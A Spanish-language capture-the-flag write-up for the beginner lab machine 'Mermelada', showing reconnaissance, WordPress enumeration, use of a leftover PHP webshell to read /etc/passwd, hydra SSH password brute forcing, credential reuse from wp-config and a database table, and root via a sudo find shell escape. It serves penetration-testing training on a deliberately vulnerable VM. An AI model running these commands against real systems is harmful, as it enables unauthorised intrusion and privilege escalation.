---
Estado: En Curso
Plataforma: The Hackers Labs
SO: Linux
Dificultad: Principiante
VectorInicial: Webshell discovery
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
 - debian:12345
 - mermeladita:pepitU
 - mysql root:12345
Usuarios:
 - debian
 - mermeladita
 - root
Privesc: sudo find
Tecnicas:
 - Network Discovery
 - Directory Enumeration
 - WordPress Enumeration
 - Webshell Discovery
 - Command Execution
 - User Enumeration
 - Password Brute Force
 - Credential Reuse
 - Database Enumeration
 - Privilege Escalation
Herramientas:
 - arp-scan
 - gomap
 - gobuster
 - wpscan
 - hydra
 - mysql
Fecha: 2026-03-05
---
![Uploading Pasted image 20260305084513.png…]()

Empezaremos con el descubrimiento de la red para ver donde se encuentra la maquina objetivo.

```bash
 sudo arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
10.0.11.2	08:00:27:e3:61:b5	(Unknown)
10.0.11.14	08:00:27:84:6c:4e	(Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.869 seconds (136.97 hosts/sec). 3 responded
```

Sabiendo que la dirección es **10.0.11.14** procederemos a la enumeración de puertos abiertos y ver posibles vectores de entrada e información.

```bash
 settarget 10.0.11.14
TARGET establecido: 10.0.11.14

 gomap -p - $TARGET 

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.14 (65535 ports)

PORT    STATE 
22      open  
80      open  

Host Exposure Summary
- 10.0.11.14 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 40.912s | hosts: 1 | open ports: 2

 gomap -s -p 22,80 $TARGET

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.14 (2 ports)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u7
80      open   http            Apache 2.4.65 (Debian)

Host Exposure Summary
- 10.0.11.14 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 61ms | hosts: 1 | open ports: 2
```

Obtenemos 2 puertos abiertos:
- 22 para conexión *ssh*
- 80 para conexión *http* para web

Veamos que tipo de web nos encontramos.

Nos encontramos con una web estática, pero tiene un formulario abajo del todo para buscar ciudades que al usarlo nos arroja un error de no encontrar el destino.

```http
http://10.0.11.14/mermelada.php?zona=madrid
```

Pero ademas vemos que esta pidiendo los datos mediante **URL** esto puede suponer un vector de ataque.

Antes de abordarlo continuaremos con una enumeración de directorios y ficheros.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.11.14/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 3884]
login.php            (Status: 200) [Size: 1700]
uploads              (Status: 301) [Size: 310] [--> http://10.0.11.14/uploads/]
wordpress            (Status: 301) [Size: 312] [--> http://10.0.11.14/wordpress/]
server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesante, por un lado tenemos la pagina *logn.php* que puede ser una entrada y por otro tenemos una carpeta llamada *wordpress* que puede ser interesante.

Curiosamente dentro de *uploads* hay un fichero llamado *compras.txt* con el siguiente contenido:

```txt
[+] Mermelada de fresa

[+] Mermelada de frambuesa

[+] Mermelada de mora

[+] Mermelada de dW4gcGlxdWl0bz8K

[+] Mermelada de albaricoque

[+] Mermelada de mango
```

Este texto nos da una pista que puede ser una contraseña, pero de momento la apuntamos.

En la carpeta de *wordpress* nos encontramos que esta todo mal diseñado, eso indica un dominio y al intentar hacer click en algunos enlaces lo confirmamos.

```http
http://mermelada.thl/wordpress
```

Añadamos este dominio a nuestro */etc/hosts*

```bash
 sudo nano /etc/hosts

 cat /etc/hosts                                                                                                  
───────┬─────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   jd-sec.intracof.local   jd-sec
   3   │ 
   4   │ # The following lines are desirable for IPv6 capable hosts
   5   │ ::1     localhost ip6-localhost ip6-loopback
   6   │ ff02::1 ip6-allnodes
   7   │ ff02::2 ip6-allrouters
   8   │ 
   9   │ 10.0.11.14 mermelada.thl
───────┴─────────────────────────────────────────────────────────────────────────
```

Ahora veamos si podemos encontrar algo interesante.

A simple vista no hay nada interesante así que usaremos herramientas de consola como **wpscan**.

```bash
 wpscan --url http://mermelada.thl//wordpress/ -e u,p --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://mermelada.thl//wordpress/ [10.0.11.14]
[+] Effective URL: http://mermelada.thl/wordpress/
[+] Started: Thu Mar  5 09:33:24 2026

Interesting Finding(s):

<skip>

[+] Upload directory has listing enabled: http://mermelada.thl//wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 
<skip>

[i] Plugin(s) Identified:

[+] wpdiscuz
 | Location: http://mermelada.thl//wordpress/wp-content/plugins/wpdiscuz/
 | Last Updated: 2026-02-09T12:32:00.000Z
 | Readme: http://mermelada.thl//wordpress/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.46
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://mermelada.thl//wordpress/wp-content/plugins/wpdiscuz/, status: 200
 |
 | [!] 22 vulnerabilities identified:
 |
 | [!] Title: Comments - wpDiscuz 7.0.0 - 7.0.4 - Unauthenticated Arbitrary File Upload
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/92ae2765-dac8-49dc-a361-99c799573e61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24186
 |      - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
 |      - https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz
 |
 | [!] Title: Comments - wpDiscuz < 7.3.2 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 7.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/f51a350c-c46d-4d52-b787-762283625d0b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24737
 |
 | [!] Title: wpDiscuz < 7.3.4 - Arbitrary Comment Addition/Edition/Deletion via CSRF
 |     Fixed in: 7.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/2746101e-e993-42b9-bd6f-dfd5544fa3fe
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24806
 |      - https://www.youtube.com/watch?v=CL7Bttu2W-o
 |
 | [!] Title: wpDiscuz < 7.3.12 - Sensitive Information Disclosure
 |     Fixed in: 7.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/027e6ef8-39d8-4fa9-957f-f53ee7175c0a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23984
 |
 | [!] Title: wpDiscuz < 7.6.4 - Unauthenticated Data Modification via IDOR
 |     Fixed in: 7.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/d7de195a-a932-43dd-bbb4-784a19324b04
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3869
 |
 | [!] Title: wpDiscuz < 7.6.4 - Post Rating Increase/Decrease iva IDOR
 |     Fixed in: 7.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/051ab8b8-210e-48ac-82e7-7c4a0aa2ecd5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3998
 |
 | [!] Title: wpDiscuz < 7.6.12 - Unauthenticated Stored XSS
 |     Fixed in: 7.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/f061ffa4-25f2-4ad5-9edb-6cb2c7b678d1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47185
 |
 | [!] Title: wpDiscuz < 7.6.6 - Unauthenticated SQL Injection
 |     Fixed in: 7.6.6
 |     Reference: https://wpscan.com/vulnerability/ebb5ed9a-4fb2-4d64-a8f2-6957878a4599
 |
 | [!] Title: wpDiscuz < 7.6.4 - Author+ IDOR
 |     Fixed in: 7.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/d5e677ef-786f-4921-97d9-cbf0c2e21df9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46311
 |
 | [!] Title: wpDiscuz < 7.6.11 - Unauthenticated Content Injection
 |     Fixed in: 7.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/8c8cabee-285a-408f-9449-7bb545c07cdc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46310
 |
 | [!] Title: wpDiscuz < 7.6.11 - Insufficient Authorization to Comment Submission on Deleted Posts
 |     Fixed in: 7.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/874679f2-bf44-4c11-bc3b-69ae5ac59ced
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46309
 |
 | [!] Title: wpDiscuz < 7.6.12 - Missing Authorization in AJAX Actions
 |     Fixed in: 7.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/2e121d4f-7fdf-428c-8251-a586cbd31a96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45760
 |
 | [!] Title: wpDiscuz < 7.6.12 - Cross-Site Request Forgery
 |     Fixed in: 7.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/f8dfcc13-187c-4a83-a87e-761c0db4b6d9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47775
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/53af9dfd-eb2d-4f6f-b02f-daf790b95f1f
 |
 | [!] Title: wpDiscuz < 7.6.6 - Unauthenticated SQL Injection
 |     Fixed in: 7.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/a2fec175-40f6-4a80-84ed-5b88251584de
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/9dd1e52c-83b7-4b3e-a791-a2c0ccd856bc
 |
 | [!] Title: wpDiscuz < 7.6.13 - Admin+ Stored XSS
 |     Fixed in: 7.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/79aed6a7-a6e2-4429-8f98-ccac6b59fb4d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51691
 |      - https://patchstack.com/database/vulnerability/wpdiscuz/wordpress-wpdiscuz-plugin-7-6-12-cross-site-scripting-xss-vulnerability
 |
 | [!] Title: wpDiscuz < 7.6.16 - Authenticated (Author+) Stored Cross-Site Scripting via Uploaded Image Alternative Text
 |     Fixed in: 7.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/f3a337ae-54e5-41ca-a0d9-60745b568469
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2477
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/3eddc03d-ecff-4b50-a574-7b6b62e53af0
 |
 | [!] Title: Comments – wpDiscuz < 7.6.19 - Authenticated (Contributor+) Stored Cross-Site Scripting
 |     Fixed in: 7.6.19
 |     References:
 |      - https://wpscan.com/vulnerability/607da7a6-c2f2-4a9e-9471-8e0d29f355d9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35681
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/005bf2f0-892f-4248-afe3-263ae3d2ac54
 |
 | [!] Title: Comments – wpDiscuz < 7.6.22 - Unauthenticated HTML Injection
 |     Fixed in: 7.6.22
 |     References:
 |      - https://wpscan.com/vulnerability/66542876-77ae-442d-acde-2aac642f1d36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6704
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/fa3501a4-7975-4f90-8037-f8a06c293c07
 |
 | [!] Title: Comments – wpDiscuz < 7.6.25 - Authentication Bypass
 |     Fixed in: 7.6.25
 |     References:
 |      - https://wpscan.com/vulnerability/b95d9907-2c2d-4187-b902-d67262ea6b6d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9488
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b71706a7-e101-4d50-a2da-1aeeaf07cf4b
 |
 | [!] Title: wpDiscuz < 7.6.34 - Missing Authorization
 |     Fixed in: 7.6.34
 |     References:
 |      - https://wpscan.com/vulnerability/9a680b6e-ecbd-4ce4-b9df-4d3c16cd48e5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-59591
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/16308adf-b5d0-4519-8b1e-3d200003e8be
 |
 | [!] Title: Comments – wpDiscuz < 7.6.40 - Unauthenticated Account Takeover
 |     Fixed in: 7.6.40
 |     References:
 |      - https://wpscan.com/vulnerability/21bc9b41-a967-42dc-9916-bb993b05709c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13820
 |
 | [!] Title: wpDiscuz < 7.6.44 - Unauthenticated Insecure Direct Object Reference
 |     Fixed in: 7.6.44
 |     References:
 |      - https://wpscan.com/vulnerability/289c3c35-9fe0-4c0c-8f2b-f4c0a63242a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-68997
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7158ed57-37b4-43ac-b323-46febaaccffc
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://mermelada.thl//wordpress/wp-content/plugins/wpdiscuz/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:05 <==============================================================================> (10 / 10) 100.00% Time: 00:00:05

[i] User(s) Identified:

[+] mermeladita
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://mermelada.thl/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Finished: Thu Mar  5 09:34:34 2026
[+] Requests Done: 1576
[+] Cached Requests: 8
[+] Data Sent: 394.253 KB
[+] Data Received: 1.972 MB
[+] Memory used: 241.727 MB
[+] Elapsed time: 00:01:09
```

Por un lado tenemos el plugin vulnerable **wpDiscuz** y por el otro el usuario **mermeladita**, ademas de un *directory listing* para el **upload**.

Como teníamos una posible contraseña del fichero *compras.txt* vamos a probar la combinación en los puntos de entrada a ver si obtenemos algo.

Pero no conseguimos nada, lo que me dio a pensar en que se parecía demasiado a un *base64* y lo probe.

```bash
 echo 'dW4gcGlxdWl0bz8K' | base64 -d
un piquito?
```

Parece que la curiosidad mato al gato, pero hay lo tenemos.

Vamos a por *wordpress* con un ataque de diccionario.

```bash
 wpscan --url http://mermelada.thl//wordpress/ -U mermeladita -P /usr/share/wordlists/rockyou.txt                                           
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://mermelada.thl//wordpress/ [10.0.11.14]
[+] Effective URL: http://mermelada.thl/wordpress/
[+] Started: Thu Mar  5 09:51:28 2026

<skip>

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <=============================================================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
^CTrying mermeladita / summer21 Time: 01:18:24 <                                                                    > (28143 / 14344392)  0.19%  ETA: ??:??:^Cying mermeladita / rosean Time: 01:18:28 <                                                                      > (28179 / 14344392)  0.19%  ETA: ??:??:??
[i] No Valid Passwords Found.

^Cying mermeladita / redbone1 Time: 01:18:29 <                                                                    > (28182 / 14344392)  0.19%  ETA: ??:??:??
Scan Aborted: Canceled by User
```

Mientras terminaba de realizar el ataque me puse a mirar la carpeta de *upload* ya que tiene un *directory listing* a ver que podemos encontrar y me encontré con 3 ficheros interesantes:

```http
Index of /wordpress/wp-content/uploads/2026/01
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[   ]	macoduweklgkmvp-1767607866.7342.php	2026-01-05 11:11	47	 
[   ]	rzxvmoszvlyzzpa-1767470872.1702.php	2026-01-03 21:07	46	 
[   ]	trtznupnuremocg-1767466504.4301.php	2026-01-03 19:55	46	 
Apache/2.4.65 (Debian) Server at mermelada.thl Port 8
```

Al pulsar en cada uno de ellos solo nos muestra `GIF689a;` lo cual nos da a pensar que otra persona consiguió subir estos ficheros con una cabecera de `imagen` en un fichero `PHP`, esto indica **payload** con un *cmd* esperando a ser usado.

```http
http://mermelada.thl/wordpress/wp-content/uploads/2026/01/macoduweklgkmvp-1767607866.7342.php?cmd=cat+/etc/passwd
```

Dicho y echo, tenemos un listado completo de usuarios de sistema.

```txt
GIF689a;

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
mermeladita:x:1001:1001:mermeladita,,,:/home/mermeladita:/bin/bash
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false

```

Vemos 2 usuarios destacados, uno es *mermeladita* y el otro es *debian*.

Como estamos esperando a que termine `wpscan` usaremos otra consola con **hydra** para atacar el puerto *22* por *ssh*.

```bash
 hydra -l debian -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:31:59
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://10.0.11.14:22/
[22][ssh] host: 10.0.11.14   login: debian   password: 12345
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 10:32:05

 hydra -l mermeladita -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:32:15
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://10.0.11.14:22/
[STATUS] 97.00 tries/min, 97 tries in 00:01h, 14344302 to do in 2464:40h, 5 active
[STATUS] 85.00 tries/min, 255 tries in 00:03h, 14344144 to do in 2812:35h, 5 active
[STATUS] 81.29 tries/min, 569 tries in 00:07h, 14343830 to do in 2941:02h, 5 active
[STATUS] 83.87 tries/min, 1258 tries in 00:15h, 14343141 to do in 2850:24h, 5 active
[STATUS] 78.42 tries/min, 2431 tries in 00:31h, 14341968 to do in 3048:09h, 5 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Parece que tenemos un ganador, nuestro usuario **debian** tiene una contraseña insegura.

Vamos a conectarnos a ver que encontramos.

```bash
 ssh debian@$TARGET   
The authenticity of host '10.0.11.14 (10.0.11.14)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:26: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.11.14' (ED25519) to the list of known hosts.
debian@10.0.11.14's password: 
Linux debian 6.1.0-41-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.158-1 (2025-11-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
debian@debian:~$ ls
debian@debian:~$ ls ../mermeladita/
ls: no se puede abrir el directorio '../mermeladita/': Permiso denegado
debian@debian:~$ sudo -l
[sudo] contraseña para debian: 
Sorry, user debian may not run sudo on debian.
debian@debian:~$ find / -perm -4000 2>/dev/null 
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
debian@debian:~$
```

Parece que estamos dentro de la maquina pero no vemos nada a primera vista que nos sirva, tendremos que explorar mas.

Después de dar vueltas por los directorios nos encontramos con algo interesante:

```bash
debian@debian:~$ ls -la /opt/
total 12
drwxr-xr-x  2 root root 4096 dic 29 01:59 .
drwxr-xr-x 18 root root 4096 dic 29 00:36 ..
-rw-r--r--  1 root root  280 dic 29 01:59 .credenciales
debian@debian:~$ cat /opt/.credenciales 
-----------------------------------------------------------------
Credenciales DB 
----------------------------------------------------------------
[+] Usuario DB -----> wwwuser
[+] Contraseña DB --> micontraseña
----------------------------------------------------------------
debian@debian:~$ 
```

Esto puede ser una pista, así que intentaremos ver el fichero `wp-config` a ver si tienen los mismos datos o no.

```bash
debian@debian:~$ cat /var/www/html/wordpress/wp-config.php 

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'mermelada' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', '12345' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

<skip>
```

Parece que tenemos ganador, un usuario **root** siempre es lo mejor.

Veamos la base de datos a ver si encontramos mas usuarios.

```bash
debian@debian:~$ mysql -u root -p      
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 21395
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

No entry for terminal type "xterm-kitty";
using dumb terminal settings.
No entry for terminal type "xterm-kitty";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mermelada          |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,012 sec)

MariaDB [(none)]> use mermelada
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [mermelada]> show tables;
+-----------------------------+
| Tables_in_mermelada         |
+-----------------------------+
| users                       |
| wp_commentmeta              |
| wp_comments                 |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
20 rows in set (0,001 sec)

MariaDB [mermelada]> select * from wp_users;
+----+-------------+-----------------------------------------------------------------+---------------+------------------+---------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login  | user_pass                                                       | user_nicename | user_email       | user_url                        | user_registered     | user_activation_key | user_status | display_name |
+----+-------------+-----------------------------------------------------------------+---------------+------------------+---------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | mermeladita | $wp$2y$10$97ImPDZCJeeYbF7sWojtSeVWbXfdP2Qo9S463okHdt1rRJYRqkYmi | mermeladita   | prueba@gmail.com | http://192.168.91.159/wordpress | 2026-01-03 17:32:19 |                     |           0 | mermeladita  |
+----+-------------+-----------------------------------------------------------------+---------------+------------------+---------------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0,001 sec)

MariaDB [mermelada]> select * from users;   
+----+-------------+--------+
| id | usuario     | passwd |
+----+-------------+--------+
|  1 | mermeladita | pepitU |
+----+-------------+--------+
1 row in set (0,001 sec)

MariaDB [mermelada]> quit
Bye
```

Bueno parece que tenemos una contraseña, así que vamos a usarla para ver si podemos cambiar de usuario.

```bash
debian@debian:~$ su mermeladita               
Contraseña: 
mermeladita@debian:/home/debian$ cd
mermeladita@debian:~$ ls
user.txt
mermeladita@debian:~$ 
```

Bien hemos cambiado de usuario, veamos si podemos escalar privilegios.

```bash
mermeladita@debian:~$ sudo -l
Matching Defaults entries for mermeladita on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mermeladita may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

Veamos si en [GtfoBins](https://gtfobins.org/gtfobins/find/) hay una opción para escalar desde `find`.

```bash
mermeladita@debian:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# ls /root
congrats.txt  root.txt
# 
```

Y con esto obtenemos acceso como **root** y comprometemos la maquina.
